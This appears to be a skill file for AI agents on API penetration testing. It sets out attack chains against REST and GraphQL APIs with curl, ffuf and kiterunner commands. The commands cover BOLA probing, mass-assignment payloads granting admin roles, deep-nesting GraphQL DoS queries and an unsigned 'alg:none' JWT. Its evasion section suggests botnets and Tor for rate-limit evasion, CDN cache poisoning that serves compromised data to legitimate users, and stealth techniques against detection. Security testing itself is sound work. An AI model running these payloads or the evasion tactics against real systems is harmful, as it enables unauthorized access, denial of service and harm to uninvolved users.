# api-security

# Skill: API Security Testing

> **Supplementary Files**:
> - `payloads.md` — Complete payload collection organized by attack type (endpoint discovery, BOLA, Mass Assignment, JWT, GraphQL, etc. — 8 major categories)
> - `test-cases.md` — Structured test case templates (20 cases covering authentication & authorization, input validation, rate limiting, data exposure, GraphQL, and configuration leakage — 6 categories)

## Summary

Api Security skill domain covering web attack operations.

**Tools**: Burp Suite, Postman, ffuf, GraphQLMap, kiterunner

**Domain**: web-attack

**OWASP**: API Security Top 10

## Description

API Security Testing covers security assessment across three major API architectures: REST, GraphQL, and gRPC, focusing on the OWASP API Security Top 10 core risks: Broken Authentication, Broken Object Level Authorization (BOLA), Excessive Data Exposure, Rate Limiting Bypass, and Mass Assignment.

**Core Attack Surfaces**:

- **Broken Authentication**: Hardcoded API key leakage, JWT algorithm confusion (`alg:none` / RS256->HS256), missing token invalidation, OAuth flow hijacking.
- **Authorization Failures**: BOLA (IDOR in API form) horizontal privilege escalation to access resources, BPLA (Broken Property Level Authorization) tampering with read-only properties (e.g., `role` / `is_admin`), incomplete permission matrix.
- **Excessive Data Exposure**: API responses returning complete database records instead of minimal necessary fields, sensitive fields (password hashes / internal IDs) not filtered, error messages leaking stack traces/SQL.
- **Rate Limiting Bypass**: IP spoofing via `X-Forwarded-For` / `X-Originating-IP` headers, parameter pollution (`?rate_limit_bypass=1`), concurrent requests bypassing sliding windows.
- **GraphQL-Specific Risks**: Introspection queries leaking complete schema, deep nested query DoS, batch query brute force enumeration, missing field-level authorization.
- **gRPC Risks**: Protobuf deserialization vulnerabilities, unencrypted channels (plaintext h2c), reflection service information leakage.

**Related Skills**:
- `skills/web-auth-bypass/SKILL.md` — Complete skills for JWT attacks, authentication bypass, and MFA bypass (complements the authentication dimension of JWT/BOLA testing in this skill)
- `skills/web-access-control/SKILL.md` — Access control vulnerabilities (defense perspective reference for BOLA/BPLA)

---

## Use Cases

1. **API Penetration Testing**: Systematically enumerate API endpoints (REST paths / GraphQL operations / gRPC methods), testing authentication, authorization, and input validation at each layer.
2. **REST API Security Audit**: Test each CRUD endpoint individually for BOLA, Mass Assignment, Rate Limiting, and response data overexposure.
3. **GraphQL Security Assessment**: Detect introspection leakage, query depth limits, batch/mutation abuse, and field-level access control.
4. **API Authentication Mechanism Testing**: JWT security analysis (algorithm confusion / key brute force / no signature), API key leakage detection, OAuth implementation audit.
5. **Rate Limiting and Brute Force Protection Assessment**: Verify bypassability of rate limiting mechanisms, test account enumeration and credential stuffing defenses.

---

## Core Tools

| Tool | Purpose | Command Example |
|------|---------|-----------------|
| **Burp Suite** | API proxy interception, authorization testing, Intruder brute force enumeration, response comparison analysis | Proxy intercept API request -> Autorize plugin test BOLA -> Comparer compare responses for different IDs |
| **Postman** | API request construction, batch collection testing, Pre-request Script automated token refresh | Set Environment Variables -> Write Collection Runner batch tests for different user permissions |
| **ffuf** | API endpoint fuzzing, path enumeration, parameter brute force | `ffuf -w api_endpoints.txt -u https://target.com/FUZZ -H "Authorization: Bearer TOKEN" -mc 200,403` |
| **GraphQLMap** | GraphQL-specific security testing: introspection, field fuzzing, mutation abuse | `graphqlmap -u https://target.com/graphql` -> `introspection` / `dos FIELD` |
| **kiterunner** | API route discovery, large-scale path enumeration based on Swagger/OpenAPI specs | `kr scan https://target.com -w routes.kite -x 20` |

Auxiliary tools: **jwt_tool** (JWT attack suite), **Postman Collections** (API regression testing), **Nuclei** (API vulnerability template scanning), **Arjun** (HTTP parameter discovery), **graphtester** (in-depth GraphQL testing).

---

## Methodology

### Attack Chain

```
[1] API Discovery        [2] Authentication     [3] Authorization
  - Endpoint enumeration   - JWT security analysis      - BOLA testing (IDOR)
    (kiterunner)            - API key leakage detection  - BPLA property tampering
  - Swagger/OpenAPI leak   - OAuth flow audit           - Permission matrix verification
  - GraphQL Introspection  - Authentication bypass      - Horizontal/vertical privilege
  - gRPC reflection probe    attempts                     escalation
       |                        |                        |
       v                        v                        v
[4] Input Validation     [5] Rate Limiting      [6] Data Exposure
  - Parameter injection     - Header bypass            - Response field audit
  - Mass Assignment         - IP spoofing bypass       - Sensitive data filtering
  - Content-Type abuse      - Concurrent request bypass - Error message leakage
  - GraphQL query injection - Sliding window breakthrough - Pagination parameter abuse
```

## Practical Steps

> **For detailed payloads see `payloads.md`, and for the complete test checklist see `test-cases.md`.** Below is a summary of core operations for each phase.

### 1. API Endpoint Discovery and Fuzzing

```bash
# kiterunner - Spec-based route discovery
kr scan https://target.com -w /usr/share/wordlists/kiterunner/routes.kite -x 20

# ffuf - API path fuzzing
ffuf -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
     -u https://target.com/api/v1/FUZZ \
     -H "Authorization: Bearer TOKEN" -mc 200,201,403,401 -fc 404

# ffuf - HTTP method fuzzing
ffuf -w GET,POST,PUT,PATCH,DELETE,OPTIONS \
     -u https://target.com/api/v1/users/123 \
     -X FUZZ -H "Authorization: Bearer TOKEN" -mc 200,201,204,403

# Introspection Query - Retrieve complete schema
curl -s -X POST https://target.com/graphql \
     -H "Content-Type: application/json" \
     -d '{"query":"{__schema{types{name,fields{name}}}}"}' | jq .

# GraphQLMap - Interactive testing
graphqlmap -u https://target.com/graphql
# > introspection     # Retrieve schema
# > dos user          # Deep query DoS test
# > batchquery 1000   # Batch query test

# Deep nested query DoS
curl -s -X POST https://target.com/graphql \
     -d '{"query":"{user(id:1){posts{comments{user{posts{comments{id}}}}}}}"}'

# Unauthorized mutation test
curl -s -X POST https://target.com/graphql \
     -d '{"query":"mutation{updateUser(id:1,role:\"admin\"){id,role}}"}'
```

### 3. BOLA (Broken Object Level Authorization) Testing

```bash
# Basic IDOR test - Replace resource ID
curl -s -H "Authorization: Bearer USER_A_TOKEN" \
     https://target.com/api/v1/users/123/profile    # Own resource
curl -s -H "Authorization: Bearer USER_A_TOKEN" \
     https://target.com/api/v1/users/456/profile    # Another user's resource -> 200 means BOLA

# Normal update request
curl -s -X PATCH https://target.com/api/v1/users/123 \
     -H "Authorization: Bearer TOKEN" -H "Content-Type: application/json" \
     -d '{"name":"Test User"}'

# Mass Assignment - Inject read-only properties (role / is_verified / email_verified_at)
curl -s -X PATCH https://target.com/api/v1/users/123 \
     -H "Authorization: Bearer TOKEN" -H "Content-Type: application/json" \
     -d '{"name":"Test User","role":"admin","is_verified":true}'
# If response returns role as "admin" -> Mass Assignment confirmed

# Registration endpoint Mass Assignment
curl -s -X POST https://target.com/api/v1/register \
     -H "Content-Type: application/json" \
     -d '{"username":"test","password":"P@ss1234","email":"t@t.com","role":"admin"}'
```

### 5. Rate Limit Bypass

```bash
# Method 1: X-Forwarded-For IP spoofing (change IP with each request)
curl -s -H "X-Forwarded-For: 10.0.0.$((RANDOM%255))" \
     -H "Authorization: Bearer TOKEN" https://target.com/api/v1/sensitive-endpoint

# Method 2: Multiple header stacking
curl -s -H "X-Forwarded-For: 1.2.3.4" -H "X-Originating-IP: 1.2.3.4" \
     -H "X-Remote-IP: 1.2.3.4" -H "X-Client-IP: 1.2.3.4" \
     https://target.com/api/v1/login

# Method 3: Concurrent requests bypassing sliding window (Turbo Intruder / custom scripts)

# Method 4: Path mutation bypass
curl -s https://target.com/api/v1/endpoint?param=value&_=$(date +%s)
curl -s https://target.com/api/v1/./endpoint?param=value
```

## Defense Evasion Techniques

### Rate Limit Evasion
- **Distributed sources**: Rotate through residential proxies, Tor, or botnets to spread load across IPs.
- **Slow & low**: Pace requests below rate-limit threshold (e.g., 1 req/sec); use jitter to avoid pattern detection.
- **IP rotation**: Cloud provider accounts with autoscaling IPs; AWS Lambda / serverless rotation.
- **Header manipulation**: Spoof `X-Forwarded-For`, `X-Real-IP`, `True-Client-IP` to bypass IP-based limits.
- **Multiple accounts**: Distribute enumeration across many authenticated sessions (user A probes 100 IDs, user B probes next 100).

### Authentication Bypass
- **JWT algorithm confusion**: If server uses RS256 (asymmetric), test if it accepts HS256 with public key as HMAC secret.
- **kid header injection**: `"kid": "../../dev/null"` or SQL injection in `kid` lookup.
- **null signature**: `eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.` bypasses signature check on weak libraries.
- **Token replay**: Reuse captured JWT past expiration if server clock drift exists.
- **Refresh token abuse**: Use long-lived refresh tokens to maintain access after password reset.

### Authorization Evasion (BOLA)
- **UUID prediction**: If UUIDs are v1 (time-based), predict next UUIDs from observed timestamps.
- **Sequential IDs**: Brute force `/api/users/1`, `/api/users/2`, ... when IDs are auto-increment integers.
- **Method swap**: Try `GET /api/users/123` blocked, try `PUT /api/users/123` or `PATCH` allowed.
- **Nested resource paths**: `/api/orgs/5/users/123` may bypass `/api/users/123` authorization.
- **Inconsistent object keys**: Use email instead of ID, or username, or slug — different code paths may have different authorization.

### GraphQL Evasion
- **Alias abuse**: Use multiple aliases to bypass query depth limits (`{a: user b: user c: user}`).
- **Batch queries**: Single request with multiple operations to bypass rate limits.
- **Fragment cycling**: Cycle through fragments to extract data without triggering query complexity limits.
- **Directive abuse**: Use `@skip(if: false)` and `@include(if: true)` to obfuscate queries.
- **Mutation via GET**: Some GraphQL endpoints allow mutations via GET (bypasses CSRF protection).

### Stealth Techniques
- **Mimic legitimate clients**: Use exact User-Agent / Accept-Language / Referer headers from official mobile app.
- **Spread timing**: Spread BOLA tests across hours; cache results locally to avoid re-querying.
- **Cache poisoning**: Poison CDN cache of BOLA response so subsequent legitimate users see compromised data.
- **Schema obfuscation**: Use complex GraphQL queries that look like legitimate analytics to evade schema validation.
- **TLS fingerprinting**: Use `curl-impersonate` or `pyhttpx` to mimic browser TLS fingerprints.

---
